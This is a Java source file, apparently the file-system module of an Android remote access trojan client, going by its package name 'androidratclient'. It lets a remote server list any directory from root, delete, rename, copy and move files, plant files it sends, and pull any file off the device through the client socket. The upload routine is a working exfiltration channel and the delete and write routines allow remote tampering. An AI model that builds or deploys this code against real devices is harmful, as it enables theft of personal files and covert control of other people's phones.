package com.dev.ah10.androidratclient;

import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

@SuppressWarnings("SpellCheckingInspection")
class FileSystem //Class to interact with the file system
{
    private String tempFile; //The file path to transfer
    private int xferMode; //The transfer mode for the file (copy, move)
    private final int xfer_copy = 0; //const transfer mode for copy
    private final int xfer_move = 1; //const transfer mode for move
    private ClientSocket cs; //Client Socket Reference
    private Integer downloadMax = 0; //The file size to download
    private Integer downloadFinished = 0; //The bytes downloaded from the file
    private OutputStream downloadFileStream; //The outputStream to the file

    FileSystem(ClientSocket socket) //Constructor
    {
        //Set the class global variables
        cs = socket;
    }

    String listFiles(String path) //List the entries in the specified directory
    {
        File directory = new File(path); //The target directory
        if (!directory.exists()) return "flist|failed"; //If directory doesn't exist return failed
        File[] files = directory.listFiles(); //Entries in directory
        StringBuilder sb = new StringBuilder();
        sb.append("flist|"); //Response command

        for (File f : files) //Loop through the entries
        {
            sb.append(f.getName()).append(";") //Files name
                    .append(f.length()).append(";") //File size in bytes
                    .append(f.getPath()).append(";") //Full file path
                    .append((f.isFile()) ? "y" : "n").append("|"); //Is File
        }

        String result = sb.toString();
        return result.substring(0, result.length() - 1); //Cut the last separator char
    }

    void copyFile(String filePath) //Save the transfer data for a copy operation
    {
        tempFile = filePath;
        xferMode = xfer_copy;
    }

    void moveFile(String filePath) //Save the transfer data for a move operation
    {
        tempFile = filePath;
        xferMode = xfer_move;
    }

    boolean deleteFile(String path) //Delete a file or directory
    {
        File f = new File(path);
        return !f.exists() || f.delete(); //if file doesn't exists return true else return the result of delete
    }

    boolean renameFile(String path, String newName) //Rename a file or directory
    {
        File f = new File(path); //The file to rename
        File f2 = new File(f.getParent() + "/" + newName); //The new (renamed) file
        if (!f.exists()) return false; //If the original file doesn't exist then return false
        boolean result; //Move result
        if (f.isFile()) result = doMoveFile(f, f2); //Move file
        else result = doMoveDirectory(f, f2); //Move directory

        return result; //Return the move result
    }

    boolean downloadFile(byte[] receivedFilePart) //Download a file part
    {
        try
        {
            downloadFileStream.write(receivedFilePart, 0, receivedFilePart.length); //Write the data to the open file stream
            downloadFinished += receivedFilePart.length; //Increment the bytes written count
            if (downloadFinished.equals(downloadMax)) //If bytes written = total bytes
            {
                downloadFileStream.close(); //Close the files stream
                downloadFinished = 0; //Reset the bytes written
                downloadMax = 0; //Reset the total bytes
                return true; //Return true (can resume normal command interpretation)
            }

            return false; //Continue to download raw bytes from stream
        }
        catch (Exception ex) //Write failed
        {
            Log.e("FileSystem", "Failed to download part: " + ex.toString());
            return false;
        }
    }

    boolean initDownloadFile(String filePath, Integer fileLength) //Init a file download
    {
        try
        {
            File f = new File(filePath); //The target file
            downloadFileStream = new FileOutputStream(f); //Create a fileStream
            downloadMax = fileLength; //Set the file size to download
            downloadFinished = 0; //set the written bytes to 0
            return true; //return true -> can start file download
        }
        catch (Exception ex) //Failed to create stream
        {
            Log.e("FileSystem", "Download init failed: " + ex.toString());
            return false; //return false -> can't download file
        }
    }

    void uploadFile(String path) //Upload a file
    {
        final File f = new File(path); //The file to upload
        if (!f.exists()) cs.sendResponse("fconfirm|failed"); //If file doesn't exists cancel upload
        cs.sendResponse("fconfirm|" + f.length()); //Confirm upload with file size
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                try
                {
                    Thread.sleep(5000); //Wait for server to handle response

                    InputStream input = new FileInputStream(f); //Create a new fileStream
                    byte[] buffer = new byte[4096]; //The file read buffer
                    int bytesRead; //bytes read from file
                    while ((bytesRead = input.read(buffer)) > 0) //Read from the file
                    {
                        cs.sendBytes(buffer, bytesRead, true); //Send bytes read from the file to the server
                    }
                }
                catch (Exception ex) {Log.e("FileSystem", "Upload failed: " + ex.toString());} //Upload failed
            }
        });

        t.start();
    }

    boolean pasteFile(String dest) //Paste (transfer) a file or directory
    {
        File f = new File(tempFile); //Source
        File f2 = new File(dest + "/" + f.getName()); //Destination
        boolean result = false; //Transfer result
        boolean isFile = f.isFile(); //Source is file
        if (isFile)
        {
            if (xferMode == xfer_copy) result = doCopyFile(f, f2); //Copy file
            if (xferMode == xfer_move) result = doMoveFile(f, f2); //Move file
        }
        else
        {
            if (xferMode == xfer_copy) result = doCopyDirectory(f, f2); //Copy Directory
            if (xferMode == xfer_move) result = doMoveDirectory(f, f2); //Move directory
        }

        return result; //return the transfer result
    }

    private boolean doMoveDirectory(File source , File destination) //Move a directory
    {
        boolean r1 = doCopyDirectory(source, destination); //Copy the directory
        boolean r2 = source.delete(); //Delete the source directory

        return r1 && r2; //Return both results
    }

    private boolean doCopyDirectory(File sourceLocation , File targetLocation) //Copy a directory
    {
        //https://stackoverflow.com/questions/5715104/copy-files-from-a-folder-of-sd-card-into-another-folder-of-sd-card

        try
        {
            if (sourceLocation.isDirectory()) //if source is directory
            {
                if (!targetLocation.exists() && !targetLocation.mkdirs()) //If destination doesn't exists and can't create it
                {
                    return false;
                }

                String[] children = sourceLocation.list(); //Get source entries
                for (String aChildren : children) { //Loop through them
                    doCopyDirectory(new File(sourceLocation, aChildren), //Copy sub entries
                            new File(targetLocation, aChildren));
                }
            }
            else //Source is file
            {

                // make sure the directory we plan to store the recording in exists
                File directory = targetLocation.getParentFile();
                if (directory != null && !directory.exists() && !directory.mkdirs()) {
                    return false;
                }

                InputStream in = new FileInputStream(sourceLocation);
                OutputStream out = new FileOutputStream(targetLocation);

                // Copy the bits from instream to outstream
                byte[] buf = new byte[1024];
                int len;
                while ((len = in.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
                in.close();
                out.close();
            }

            return true;
        }
        catch (Exception ex)
        {
            Log.e("FileSystem", "Directory Copy Error: " + ex.toString());
            return false;
        }
    }

    private boolean doMoveFile(File source, File destination) //Move file
    {
        boolean fileCopied = doCopyFile(source, destination); //Copy the file
        boolean fileDeleted = source.delete(); //Delete the source file
        return fileCopied && fileDeleted; //Return both results
    }

    private boolean doCopyFile(File source, File destination) //Copy file
    {
        try
        {
            boolean fileCreated = true; //file create result
            if (!destination.exists()) fileCreated = destination.createNewFile(); //Create the destination file
            if (!fileCreated) return false; //if can't create destination file return false
            InputStream srcFile = new FileInputStream(source); //Source FileStream
            OutputStream dstFile = new FileOutputStream(destination); //Destination FileStream
            byte[] buffer = new byte[2048]; //Read buffer
            int bytesRead; //bytes read from source

            while ((bytesRead = srcFile.read(buffer)) > 0) //Read bytes from source
            {
                dstFile.write(buffer, 0, bytesRead); //Write read bytes to destination
            }

            //Close file streams
            srcFile.close();
            dstFile.close();

            return true; //Success -> return true
        }
        catch (Exception ex)
        {
            Log.e("FileSystem", "Failed to copy file: " + ex.toString());
            return false; //Failed to copy -> return files
        }
    }

    String listFiles() //Lists files at /
    {
        return listFiles("/");
    }
}
